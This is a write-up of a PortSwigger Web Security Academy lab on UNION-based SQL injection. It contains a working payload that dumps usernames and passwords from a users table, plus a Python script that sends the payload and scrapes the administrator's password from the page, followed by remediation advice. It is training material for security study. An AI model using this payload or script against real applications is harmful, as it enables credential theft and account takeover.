# SQL Injection UNION Attack, Retrieving Data from Other Tables
**Platform:** PortSwigger Web Security Academy
**Category:** SQL Injection
**Date:** 2026-08-18

## The Problem
The application's product category filter ran a query similar to:

```sql
SELECT * FROM products WHERE category = 'Gifts'
```

With the reconnaissance from the previous labs complete — the number of columns (lab 3) and which column accepts text (lab 4) — the final step is using `UNION SELECT` to pull real data out of a completely different table (`users`) instead of just probing the query's structure.

## Discovery / Exploitation
Once the string-compatible column position is known, that column can be swapped from a placeholder marker to an actual column pulled from another table. Since `username` and `password` are both text, and the target table only needed 2 columns for this lab, the payload becomes:

```
' UNION SELECT username, password FROM users--
```

Resulting query:
```sql
SELECT * FROM products WHERE category = 'Gifts' UNION SELECT username, password FROM users--'
```

This returns every row from the `users` table appended to the product results, with `username` and `password` displayed in the same fields the product listing normally uses to show product name and description. Scanning the page for `"administrator"` locates the row of interest, and the adjacent cell holds the corresponding password in plaintext.

## Impact
This is full credential disclosure — an attacker can dump every username and password (or password hash, depending on how the application stores them) in the database directly from a public-facing filter parameter, with no authentication required. In this case it specifically exposes the administrator account's password, enabling complete account takeover.

## Proof of Concept (Python)
This script sends the UNION payload through Burp Suite (`127.0.0.1:8080`), then parses the HTML response with BeautifulSoup to locate the "administrator" username and extract the password shown next to it.

```python
import requests
import sys
import urllib3
from bs4 import BeautifulSoup
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}


def exploit_sqli_users_table(url):
    path = '/filter?category=Gifts'
    sql_payload = "'+union+select+username,+password+from+users--"
    r = requests.get(url + path + sql_payload, verify=False, proxies=proxies)
    res = r.text
    if "administrator" in res:
        print("[+] found the administrator password.")
        soup = BeautifulSoup(res, 'html.parser')
        admin_password = soup.body.find(string="administrator").parent.find_next('td').text
        print("[+] the administrator password is '%s'" % admin_password)
        return True
    return False


if __name__ == "__main__":
    try:
        url = sys.argv[1].strip()
    except IndexError:
        print("[-] Usage: %s <url>" % sys.argv[0])
        print("[-] Example: %s https://www.example.com" % sys.argv[0])
        sys.exit(-1)

    print("[+] Dumping the username and the password...")
    if not exploit_sqli_users_table(url):
        print("[-] Did not find an administrator password.")
```

**How it works:**
1. Takes the target URL as a command-line argument
2. Sends a `UNION SELECT username, password FROM users` payload to the vulnerable `category` parameter
3. Checks whether `"administrator"` appears anywhere in the returned page — confirming the users table was successfully merged into the results
4. Uses BeautifulSoup to locate the table cell containing "administrator" and reads the value from the next `<td>`, which holds the corresponding password
5. Prints the recovered password, or reports failure if the administrator row wasn't found

**Example run:**
```bash
pip install beautifulsoup4 --break-system-packages
python3 exploit_sqli_dump_credentials.py https://your-lab-url.web-security-academy.net
```

**Note:** This payload assumes a 2-column result (matching lab 3's column count for this specific lab). For a different column count, the `UNION SELECT` needs `NULL` placeholders for the extra columns, with `username`/`password` placed in whichever positions were confirmed to accept text in lab 4.

## Remediation
- Use **parameterized queries (prepared statements)** — this alone prevents the entire attack chain from labs 3–5, since user input would never be able to alter the query's structure or pull in an unrelated table.
- Apply the **principle of least privilege** to the database account the application uses — it should not have read access to sensitive tables like `users` if the application logic never legitimately needs it there.
- **Never store plaintext passwords** — even if injection is somehow possible, properly hashed and salted passwords limit the damage of a dump like this.
- Avoid exposing **raw database errors and structural feedback** to the client, which is what made the earlier reconnaissance steps (column count, column type) possible in the first place.

## Takeaway
This lab is the payoff of the full UNION-based attack chain built across labs 3–5: determine column count → determine which column accepts text → substitute a real query against a sensitive table into that structure. It's a clear demonstration of why SQL injection is rated so highly on the OWASP Top 10 — a single unsanitized input field, combined with patient reconnaissance, escalates all the way to full credential theft with no authentication needed at any step.
